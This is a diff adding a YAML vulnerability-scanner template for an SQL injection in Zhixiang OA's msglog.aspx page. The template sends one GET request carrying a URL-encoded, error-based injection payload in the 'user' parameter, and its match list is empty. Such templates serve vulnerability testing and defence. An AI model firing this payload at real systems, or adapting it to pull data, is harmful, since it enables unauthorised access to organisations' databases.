@@ -1,0 +1,16 @@
+id: zhixiang-oa-msglog-sqli
+brief:
+    title: Zhixiang OA msglog.aspx - SQL injection
+    by: SleepingBag945
+    level: high
+    about: There is a SQL injection vulnerability in the msglog.aspx file of Zhixiang OA. Attackers can obtain sensitive information through the vulnerability.
+    label:
+        - hongfan
+        - oa
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))--'
+      signs: []
